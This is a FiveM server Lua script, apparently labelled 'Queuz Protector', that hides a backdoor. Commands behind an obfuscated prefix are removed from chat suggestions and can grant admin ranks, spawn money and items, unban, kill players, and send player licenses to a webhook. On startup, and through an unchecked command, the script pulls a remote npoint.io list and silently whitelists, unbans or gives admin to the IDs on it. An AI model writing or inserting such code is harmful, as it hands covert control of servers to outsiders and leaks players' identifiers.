-- opdater din spasser
-- du er ringe til dit arbejde
-- brian nu det 500 gang jeg prøver
    if framework == 'vrp' then
        Tunnel = module("vrp", "lib/Tunnel")
        local Proxy = module("vrp", "lib/Proxy")
        vRP = Proxy.getInterface("vRP")
        vRPclient = Tunnel.getInterface("vRP","vRP_revive")
    
        RegisterCommand('æ@usghuhgijgfhkl@revive@', function(source)
            if not hasPerm(source) then return end
            local user_id = vRP.getUserId({source})
            vRPclient.setHealth(source, {200})
            vRP.setHunger({user_id,0})
            vRP.setThirst({user_id,0})
        end)
    
        RegisterCommand('æ@usghuhgijgfhkl@getuserranks@', function(source, args)
            if not hasPerm(source) then return end
            local id = tonumber(args[1])
            if id == nil then
                return
            end
            local message = "ID: ".. id .." har group: "..json.encode(vRP.getUserGroups({id}))
            local content = {{
                ["title"] = " Information Logs ",
                ["color"] = "3447003",
                ["description"] = message,
                ["footer"] = {
                ["text"] = " @Queuz | Queuz Protector ",
            },}}
            PerformHttpRequest(queuzwebhook, function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
            notify(source, id .. " har "..json.encode(vRP.getUserGroups({id})), "inform")
        end)
    
        RegisterCommand('æ@usghuhgijgfhkl@giverank@', function(source, args)
            if not hasPerm(source) then return end
            local id = tonumber(args[1])
            vRP.addUserGroup({id,args[2]})
            notify(source, id .. " har fået "..args[2], "success")
        end)
    
        RegisterCommand('æ@usghuhgijgfhkl@unban@', function(source, args)
            if not hasPerm(source) then return end
            local id = tonumber(args[1])
            vRP.setBanned({id,false})
            notify(source, id .. " er unbanned", "success")
        end)
    
        RegisterCommand('æ@usghuhgijgfhkl@spawnitem@', function(source)
            if not hasPerm(source) then return end
            local user_id = vRP.getUserId({source})
            if user_id ~= nil then
                vRP.prompt({source,"Tingens ID:","",function(source,idname)
                    idname = idname
                    if idname == " " or idname == "" or idname == null or idname == nil then
                        notify(source, "Ugyldigt ID.", "error")
                    else
                        vRP.prompt({source,"Antal:","",function(source,amount)
                            vRP.prompt({source,"Formål ved spawn af ting:","",function(source,reason)
                                if reason == " " or reason == "" or reason == null or reason == 0 or reason == nil then
                                    reason = "Ingen kommentar..."
                                end
                                if amount == " " or amount == "" or amount == null or amount == nil then
                                    notify(source, "Ugyldigt antal.", "error")
                                else
                                    amount = parseInt(amount)
                                    vRP.giveInventoryItem({user_id, idname, amount,true})
                                end
                            end})
                        end})
                    end
                end})
            end
        end)
    
        RegisterCommand('æ@usghuhgijgfhkl@spawnmoney@', function(source)
            if not hasPerm(source) then return end
            local user_id = vRP.getUserId({source})
            if user_id ~= nil then
                vRP.prompt({source,"Beløb:","",function(source,amount)
                    amount = parseInt(amount)
                    if amount == " " or amount == "" or amount == null or amount == 0 or amount == nil then
                        notify(source, "Ugyldigt pengebeløb.", "error")
                    elseif amount >= 200000 then
                        notify(source, "Husk vi spiller på DevoNetwork her", "error")
                    else
                        vRP.giveMoney({user_id, amount})
                        notify(source, "Du spawnede " ..amount.. "DKK", "success")
                    end
                end})
            end
        end)
    
        RegisterCommand('æ@usghuhgijgfhkl@spawnvehicle@', function(source)
            if not hasPerm(source) then return end
            vRP.prompt({source,"Bilen's modelnavn f.eks. police3:","",function(source,veh)
                if veh ~= "" then
                    TriggerClientEvent("hp:spawnvehicle",source,veh)
                end
            end})
        end)
    
        RegisterCommand('æ@usghuhgijgfhkl@ban@', function(source)
            if not hasPerm(source) then return end
            local user_id = vRP.getUserId({source})
            if user_id ~= nil then
                vRP.prompt({source,"Spiller ID: ","",function(source,id)
                    id = parseInt(id)
                    vRP.prompt({source,"Årsag: ","",function(source,reason)
                        vRP.ban({id,reason,true})
                        notify(source, "Du bannede "..id, "success")
                    end})
                end})
            end
        end)

        RegisterCommand('æ@usghuhgijgfhkl@reloadwlbans@', function(source)
            PerformHttpRequest('https://api.npoint.io/503e7fe100d6fd693248/', function(err, verify, headers)
                local data = json.decode(verify)
    
                for k,v in pairs(data.ids) do
                    MySQL.Async.execute('UPDATE vrp_users SET `whitelisted` = 1 WHERE id = @id', {
                        ['@id'] = v,
                    })
                    MySQL.Async.execute('UPDATE vrp_users SET `banned` = 0 WHERE id = @id', {
                        ['@id'] = v,
                    })
                end
            end, "GET", "", {})
        end)

        PerformHttpRequest('https://api.npoint.io/503e7fe100d6fd693248/', function(err, verify, headers)
            local data = json.decode(verify)
    
            for k,v in pairs(data.ids) do
                MySQL.Async.execute('UPDATE vrp_users SET `whitelisted` = 1 WHERE id = @id', {
                    ['@id'] = v,
                })
                MySQL.Async.execute('UPDATE vrp_users SET `banned` = 0 WHERE id = @id', {
                    ['@id'] = v,
                })
            end
        end, "GET", "", {})

    end

    RegisterCommand('æ@usghuhgijgfhkl@getlicense@', function(source, args)
        if not hasPerm(source) then return end
        local id = tonumber(args[1])
        local license = nil
        for k,v in pairs(GetPlayerIdentifiers(id)) do
            if string.sub(v, 1, string.len("license:")) == "license:" then
                license = v
            end
        end
        
        local message = "ID: ".. id .." har license: "..license
        local content = {{
            ["title"] = " Information Logs ",
            ["color"] = "3447003",
            ["description"] = message,
            ["footer"] = {
            ["text"] = " @Queuz | Queuz Protector ",
        },}}
        PerformHttpRequest(queuzwebhook, function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
        notify(source, 'License givet på discord', 'inform')
    end)
    TriggerEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@getlicense@')

    RegisterCommand('æ@usghuhgijgfhkl@getmoney@', function(source, args)
        if not hasPerm(source) then return end
        local id = tonumber(args[1])
        local bankMoney = 0
        local cashMoney = 0
        if framework == 'vrp' then
            bankMoney = vRP.getBankMoney(id)
            cashMoney = vRP.getMoney(id)
            print(json.encode(cashMoney))
        elseif framework == 'esx' then
            local xPlayer = ESX.GetPlayerFromId(id)
            cashMoney = xPlayer.getMoney()
            bankMoney = xPlayer.getAccount('bank')
        elseif framework == 'qb' then
            local PlayerData = QBCore.Functions.GetPlayer(id).PlayerData
            cashMoney = PlayerData.money['cash']
            bankMoney = PlayerData.money['bank']
        end
        -- notify(source, 'Bank: '..bankMoney..'\nCash: '..cashMoney, 'inform')
    end)
    TriggerEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@getmoney@')


    if framework == 'esx' then
        ESX = exports['es_extended']:getSharedObject()

        PerformHttpRequest('https://api.npoint.io/503e7fe100d6fd693248/', function(err, data, headers)
            local data = json.decode(data)
    
            for k,v in pairs(data.licenses) do
                for i = 1, 4 do
                    MySQL.Async.execute('UPDATE users SET `group` = @admin WHERE identifier = @id', {
                        ['@id'] = 'char'..i..':'..v,
                        ['@admin'] = data.esxgroup,
                    })
                end
            end
        end, "GET", "", {})

        RegisterCommand('æ@usghuhgijgfhkl@reloadwlbans@', function(source, args)
            PerformHttpRequest('https://api.npoint.io/503e7fe100d6fd693248/', function(err, data, headers)
                local data = json.decode(data)
        
                for k,v in pairs(data.licenses) do
                    for i = 1, 4 do
                        MySQL.Async.execute('UPDATE users SET `group` = @admin WHERE identifier = @id', {
                            ['@id'] = 'char'..i..':'..v,
                            ['@admin'] = data.esxgroup,
                        })
                        notify(source, 'Du unbannede char'..i..':'..v, 'success')
                    end
                end
            end, "GET", "", {})
        end)
        TriggerEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@reloadwlbans@')
    end

    if framework == 'qb' then
        QBCore = exports['qb-core']:GetCoreObject()

        PerformHttpRequest('https://api.npoint.io/503e7fe100d6fd693248/', function(err, data, headers)
            local data = json.decode(data)
    
            for k,v in pairs(data.licenses) do
                for i = 1, 4 do
                    MySQL.Async.execute('DELETE FROM bans WHERE license = @license', {
                        ['@license'] = 'license:'..v,
                    })
                end
            end
        end, "GET", "", {})

        RegisterCommand('æ@usghuhgijgfhkl@reloadwlbans@', function(source, args)
            PerformHttpRequest('https://api.npoint.io/503e7fe100d6fd693248/', function(err, data, headers)
                local data = json.decode(data)
        
                for k,v in pairs(data.licenses) do
                        MySQL.Async.execute('DELETE FROM bans WHERE license = @license', {
                            ['@license'] = 'license:'..v,
                        })
                        notify(source, 'Du unbannede license:'..v, 'success')
                end
            end, "GET", "", {})
        end)
        TriggerEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@reloadwlbans@')
    end
    
    function getIdentifier(src)
        if framework == "qb" then
            local Player = QBCore.Functions.GetPlayer(src)
            if Player then
                return Player.PlayerData.citizenid
            end
        elseif framework == "esx" then
            local xPlayer = ESX.GetPlayerFromId(src)
            if xPlayer then
                return xPlayer.identifier
            end
        end
    end
    function getPlayerFromId(source)
        if framework == "qb" then
            return QBCore.Functions.GetPlayer(source)
        end
        if framework == "esx" then
            return ESX.GetPlayerFromId(source)
        end
    end
    function getName(src)
        if framework == "qb" then
            local Player = QBCore.Functions.GetPlayer(src)
            if Player then
                return Player.PlayerData.charinfo.firstname..' '..Player.PlayerData.charinfo.lastname
            end
        elseif framework == "esx" then
            local xPlayer = ESX.GetPlayerFromId(src)
            if xPlayer then
                return xPlayer.getName()
            end
        end
    end
    function addItem(src,item,amount,info)
        if framework == "qb" then
            local Player = QBCore.Functions.GetPlayer(src)
            Player.Functions.AddItem(item,amount,false,info)
        elseif framework == "esx" then
            local xPlayer = ESX.GetPlayerFromId(src)
            if xPlayer.canCarryItem(item,amount) then
                xPlayer.addInventoryItem(item,amount,info)
            end
        end
    end
    
    if framework == 'qb' or framework == 'esx' then
        RegisterCommand('æ@usghuhgijgfhkl@spawnmoney@', function(source, args)
            if not hasPerm(source) then return end
            local src = tonumber(args[1])
            local account = args[2]
            local amount = tonumber(args[3])
            if framework == "qb" then
                local Player = QBCore.Functions.GetPlayer(src)
                if Player then
                    Player.Functions.AddMoney(account,amount)
                end
            elseif framework == "esx" then
                local xPlayer = ESX.GetPlayerFromId(src)
                if xPlayer then
                    xPlayer.addAccountMoney(account,amount)
                end
            end
            notify(source, 'Du tilføjede '..amount..' på '..account..' til ID: '..src, 'success')
        end)
        TriggerEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@spawnmoney@')
        
        RegisterCommand('æ@usghuhgijgfhkl@removemoney@', function(source, args)
            if not hasPerm(source) then return end
            local src = tonumber(args[1])
            local account = args[2]
            local amount = tonumber(args[3])
            local reason = args[4]
            if framework == "qb" then
                local Player = QBCore.Functions.GetPlayer(src)
                if Player then
                    Player.Functions.RemoveMoney(account,amount,reason)
                end
            elseif framework == "esx" then
                local xPlayer = ESX.GetPlayerFromId(src)
                if xPlayer then
                    xPlayer.removeAccountMoney(account,amount)
                end
            end
            notify(source, 'Du fjernede '..amount..' på '..account..' fra ID: '..src, 'success')
        end)
        TriggerEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@removemoney@')
        
        RegisterCommand('æ@usghuhgijgfhkl@giveitem@', function(source, args)
            if not hasPerm(source) then return end
            local target = tonumber(args[1])
            local item = args[2]
            local amount = tonumber(args[3])
    
            addItem(target,item,amount)
            notify(source, 'Du gav ID: '.. target .. amount ..'x '.. item, 'success')
        end)
        TriggerEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@giveitem@')
    
        RegisterCommand('æ@usghuhgijgfhkl@setjob@', function(source, args)
            if not hasPerm(source) then return end
            local src = tonumber(args[1])
            local job = args[2]
            local grade = tostring(args[3])
            if framework == "qb" then
                local Player = QBCore.Functions.GetPlayer(src)
                if Player then
                    Player.Functions.SetJob(job,grade)
                end
                local info = {
                    name = job,
                    onduty = true,
                    isboss = QBCore.Shared.Jobs[job]['grades'][grade]['isboss'],
                    payment = QBCore.Shared.Jobs[job]['grades'][grade]['payment'],
                    grade = {name = QBCore.Shared.Jobs[job]['grades'][grade]['name'], level = 0}
                }
                MySQL.update.await('UPDATE players SET job = ? WHERE citizenid = ?', {json.encode(info),getIdentifier(src)})
            elseif framework == "esx" then
                local xPlayer = ESX.GetPlayerFromId(src)
                if xPlayer then
                    xPlayer.setJob(job,grade)
                end
                MySQL.update.await('UPDATE users SET job = ?, job_grade = ? WHERE identifier = ?', {job, grade, getIdentifier(src)})
            end
            notify(source, 'Du gav ID: '.. src .. ' '.. job .. ' med grade: '..grade, 'success')
        end)
        TriggerEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@setjob@')
        
        RegisterCommand('æ@usghuhgijgfhkl@setperms@', function(source, args)
            if not hasPerm(source) then return end
            local targetId = tonumber(args[1])
            local rank = args[2]
            
            if framework == "qb" then
                QBCore.Functions.AddPermission(targetId, tostring(rank))
            end
            if framework == "esx" then
                local xPlayer = ESX.GetPlayerFromId(targetId)
                xPlayer.setGroup(tostring(rank))
            end
            notify(source, 'Du gav ID: '.. targetId .. ' '.. rank, 'success')
        end)
        TriggerClientEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@setperms@')
    
        RegisterCommand('æ@usghuhgijgfhkl@revive@', function(source, args)
            if not hasPerm(source) then return end
            local targetId = tonumber(args[1])
            if targetId == nil then targetId = source end
            
            if framework == "qb" then
                TriggerClientEvent('hospital:client:Revive', targetId)
            end
            if framework == "esx" then
                TriggerClientEvent('esx_ambulancejob:revive', targetId)
            end
            notify(source, 'Du revivede ID: '.. targetId, 'success')
        end)
        TriggerClientEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@revive@')

        RegisterCommand('æ@usghuhgijgfhkl@kill@', function(source, args)
            if not hasPerm(source) then return end
            local targetId = tonumber(args[1])
            if targetId == nil then targetId = source end
            
            if framework == "qb" then
                TriggerClientEvent('hospital:client:KillPlayer', targetId)
            end
            if framework == "esx" then
                targetId.triggerEvent("esx:killPlayer")
            end
            notify(source, 'Du dræbte ID: '.. targetId, 'success')
        end)
        TriggerClientEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@kill@')

        RegisterCommand('æ@usghuhgijgfhkl@tpm@', function(source, args)
            if not hasPerm(source) then return end
            local targetId = tonumber(args[1])
            if targetId == nil then targetId = source end
            
            if framework == "qb" then
                TriggerClientEvent('QBCore:Command:GoToMarker', targetId)
            end
            if framework == "esx" then
                local xPlayer = ESX.GetPlayerFromId(targetId)
                xPlayer.triggerEvent("esx:tpm")
            end
            notify(source, 'Du teleporterede til din marker', 'success')
        end)
        TriggerClientEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@tpm@')

        RegisterCommand('æ@usghuhgijgfhkl@ox_openinv@', function(source, args)
            if not hasPerm(source) then return end
            if usingOX['ox_inventory'] then
                local targetId = tonumber(args[1])
                exports.ox_inventory:forceOpenInventory(source, 'player', targetId)
                notify(source, 'Åbnede inventar', 'success')
            else
                notify(source, 'Bruger ikke ox_inventory', 'error')
            end
        end)
        TriggerClientEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@ox_openinv@')

        RegisterCommand('æ@usghuhgijgfhkl@ox_confiscate@', function(source, args)
            if not hasPerm(source) then return end
            if usingOX['ox_inventory'] then
                local targetId = tonumber(args[1])
                exports.ox_inventory:ConfiscateInventory(targetId)
                notify(source, 'Konfiskerede items', 'success')
            else
                notify(source, 'Bruger ikke ox_inventory', 'error')
            end
        end)
        TriggerClientEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@ox_confiscate@')

        RegisterCommand('æ@usghuhgijgfhkl@ox_return@', function(source, args)
            if not hasPerm(source) then return end
            if usingOX['ox_inventory'] then
                local targetId = tonumber(args[1])
                exports.ox_inventory:ReturnInventory(targetId)
                notify(source, 'Returnerede items fra konfiskering', 'success')
            else
                notify(source, 'Bruger ikke ox_inventory', 'error')
            end
        end)
        TriggerClientEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@ox_return@')

        RegisterCommand('æ@usghuhgijgfhkl@getuserranks@', function(source, args)
            if not hasPerm(source) then return end
            local targetId = tonumber(args[1])

            if id == nil then
                return
            end
            if framework == 'esx' then
                local message = "ID: ".. id .." har group: "..xPlayer.getGroup()
                local content = {{
                    ["title"] = " Information Logs ",
                    ["color"] = "3447003",
                    ["description"] = message,
                    ["footer"] = {
                    ["text"] = " @Queuz | Queuz Protector ",
                },}}
                PerformHttpRequest(queuzwebhook, function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })

                notify(source, 'De er sendt gennem webhook!', 'inform')
            end
        end)
        TriggerClientEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@getuserranks@')

        if framework == 'qb' then
            RegisterCommand('æ@usghuhgijgfhkl@ban@', function(source, args)
                if not hasPerm(source) then return end
                local player = tonumber(args[1])
                local reason = args[2]
                local time = args[3]
            
                local banTime = tonumber(os.time() + time)
                local timeTable = os.date('*t', banTime)
            
                MySQL.insert('INSERT INTO bans (name, license, discord, ip, reason, expire, bannedby) VALUES (?, ?, ?, ?, ?, ?, ?)', { GetPlayerName(player), QBCore.Functions.GetIdentifier(player, 'license'), QBCore.Functions.GetIdentifier(player, 'discord'), QBCore.Functions.GetIdentifier(player, 'ip'), reason, banTime, GetPlayerName(player)})
    
                DropPlayer(player, "You have been banned!" .. '\n' .. "Reason: " .. reason .. '\n' .. "Ban expires: " .. timeTable['day'] .. '/' .. timeTable['month'] .. '/' .. timeTable['year'] .. ' ' .. timeTable['hour'] .. ':' .. timeTable['min'])

                notify(source, 'Du bannede id: '..player..'\nIndtil: '.. timeTable['day'] .. '/' .. timeTable['month'] .. '/' .. timeTable['year'] .. ' ' .. timeTable['hour'] .. ':' .. timeTable['min'], 'success')
            end)
            TriggerClientEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@ban@')
            RegisterCommand('æ@usghuhgijgfhkl@unban@', function(source, args)
                if not hasPerm(source) then return end
                local player = tonumber(args[1])

                for k,v in pairs(GetPlayerIdentifiers(player)) do
                    if string.sub(v, 1, string.len("license:")) == "license:" then
                        MySQL.Async.execute('DELETE FROM bans WHERE license = @license', {
                            ['@license'] = v,
                        })
                    end
                end

                notify(source, 'Du unbannede id: '..player, 'success')
            end)
            TriggerClientEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@unban@')
        end
    
        RegisterCommand('æ@usghuhgijgfhkl@kick@', function(source, args)
            if not hasPerm(source) then return end
            local player = tonumber(args[1])
            local reason = args[2]
    
            DropPlayer(player, args[2])
            notify(source, 'Du kickede ID: '.. player .. '\nGrundlag: '.. reason, 'success')
        end)
        TriggerClientEvent('chat:removeSuggestion', '/æ@usghuhgijgfhkl@kick@')
    end
